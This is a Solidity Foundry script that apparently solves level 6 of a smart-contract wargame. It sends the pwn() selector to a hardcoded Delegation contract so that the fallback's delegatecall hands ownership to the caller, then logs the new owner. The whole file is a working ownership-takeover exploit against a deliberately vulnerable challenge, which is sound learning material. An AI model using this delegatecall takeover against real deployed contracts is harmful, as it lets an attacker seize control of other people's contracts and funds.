// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Broadcast} from "./helper/Broadcast.sol";
import {Delegation, Delegate} from "../src/L6Delegation.sol";

contract L6DelegationAttack is Script, Broadcast {
    Delegation delegation = Delegation(0x3Ca8f9C04c7e3E1624Ac2008F92f6F366A869444);

    function run() public broadcast {
        bytes memory selector = abi.encodeWithSelector(Delegate.pwn.selector);
        (bool success,) = address(delegation).call(selector);
        require(success, "Delegate call failed");
        console.log("New owner:", delegation.owner());
    }
}
